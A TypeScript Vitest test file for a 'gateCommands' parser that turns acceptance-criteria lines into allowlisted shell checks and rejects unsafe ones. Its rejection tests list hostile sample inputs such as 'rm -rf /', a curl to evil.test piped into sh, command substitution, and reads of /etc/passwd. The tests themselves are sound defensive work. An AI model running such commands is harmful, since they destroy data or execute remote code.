import { describe, expect, it } from "vitest";
import { gateCommands } from "@/lib/gates/commands";

const runnable = (lines: string[]) => gateCommands(lines).runnable;
const commands = (lines: string[]) => gateCommands(lines).runnable.map((check) => check.command);

describe("gateCommands", () => {
  it("accepts every known command head", () => {
    const lines = [
      "npm run typecheck",
      "pnpm test",
      "yarn build",
      "npx vitest run tests/cli.test.ts",
      "playwright test",
      "pytest tests/",
      "tsc --noEmit",
      "cargo test",
      "go test ./...",
      "bun test",
    ];
    expect(commands(lines)).toEqual(lines);
  });

  it("turns file checks into test -f commands", () => {
    expect(commands(["test -f bin/splitfire.ts"])).toEqual(["test -f 'bin/splitfire.ts'"]);
    expect(commands(["test -e package.json"])).toEqual(["test -e 'package.json'"]);
    expect(commands(["[ -f tests/cli.test.ts ]"])).toEqual(["test -f 'tests/cli.test.ts'"]);
    expect(commands(["tests/cli.test.ts exists"])).toEqual(["test -f 'tests/cli.test.ts'"]);
    expect(commands(["`src/types.ts` must exist"])).toEqual(["test -f 'src/types.ts'"]);
    expect(commands(["./src/types.ts exists."])).toEqual(["test -f 'src/types.ts'"]);
    expect(runnable(["test -f bin/splitfire.ts"])[0]?.kind).toBe("file");
  });

  it("runs commands that appear in backticks inside prose", () => {
    expect(commands(["`npm run typecheck` passes"])).toEqual(["npm run typecheck"]);
    expect(commands(["Run `npm run build` and `npm test`."])).toEqual([
      "npm run build",
      "npm test",
    ]);
  });

  it("strips list markers and checkboxes", () => {
    expect(commands(["- [ ] npm run build", "1. npm test", "- `npm run typecheck`"])).toEqual([
      "npm run build",
      "npm test",
      "npm run typecheck",
    ]);
  });

  it("keeps prose as manual checks and never runs it", () => {
    const acceptance = [
      "git diff --name-only touches only owned files",
      "All acceptance criteria pass",
      "feature exists",
      "The new endpoint returns 200",
    ];
    const parsed = gateCommands(acceptance);
    expect(parsed.runnable).toEqual([]);
    expect(parsed.manual).toEqual(
      acceptance.map((source) => ({ source, reason: "not-a-command" })),
    );
  });

  it("rejects anything that could chain, redirect or substitute shell work", () => {
    const unsafe = [
      "npm test; rm -rf /",
      "npm test && curl https://evil.test",
      "npm test || true",
      "npm test | sh",
      "npm run build > out.txt",
      "npm test $(whoami)",
      "npm run build `whoami`",
      "bash -c 'rm -rf /'",
      'npm run build --flag="x"',
    ];
    const parsed = gateCommands(unsafe);
    expect(parsed.runnable).toEqual([]);
    expect(parsed.manual.map((check) => check.reason)).toEqual([
      "unsafe",
      "unsafe",
      "unsafe",
      "unsafe",
      "unsafe",
      "unsafe",
      // A backticked span is treated as a candidate command; `whoami` is not one, so it is
      // reported as not-a-command instead of unsafe. Either way it is never executed.
      "not-a-command",
      "unsafe",
      "unsafe",
    ]);
  });

  it("rejects backticked commands that are not on the allowlist", () => {
    const parsed = gateCommands(["`rm -rf /`", "`curl https://evil.test | sh`"]);
    expect(parsed.runnable).toEqual([]);
    expect(parsed.manual).toHaveLength(2);
  });

  it("drops a whole line when one of its backticked commands is unknown", () => {
    const parsed = gateCommands(["Check `src/x.ts` and `npm test`"]);
    expect(parsed.runnable).toEqual([]);
    expect(parsed.manual).toEqual([
      { source: "Check `src/x.ts` and `npm test`", reason: "not-a-command" },
    ]);
  });

  it("rejects paths that are absolute, traverse upwards or look like flags", () => {
    const parsed = gateCommands(["test -f /etc/passwd", "test -f ../secrets", "test -f -rf"]);
    expect(parsed.runnable).toEqual([]);
    expect(parsed.manual.map((check) => check.reason)).toEqual(["unsafe", "unsafe", "unsafe"]);
  });

  it("only trusts python for a syntax check", () => {
    expect(commands(["python3 -m py_compile scripts/x.py"])).toEqual([
      "python3 -m py_compile scripts/x.py",
    ]);
    expect(gateCommands(["python3 scripts/x.py"]).manual).toEqual([
      { source: "python3 scripts/x.py", reason: "not-a-command" },
    ]);
  });

  it("dedupes commands and keeps the original order", () => {
    expect(
      commands(["npm run build", "git diff --name-only touches only owned files", "npm run build"]),
    ).toEqual(["npm run build"]);
  });

  it("ignores blank lines", () => {
    expect(gateCommands(["", "   ", "\t"])).toEqual({ runnable: [], manual: [] });
  });

  it("records the acceptance line each command came from", () => {
    expect(runnable(["- [ ] `npm test` passes"])).toEqual([
      { source: "- [ ] `npm test` passes", kind: "command", command: "npm test" },
    ]);
  });
});
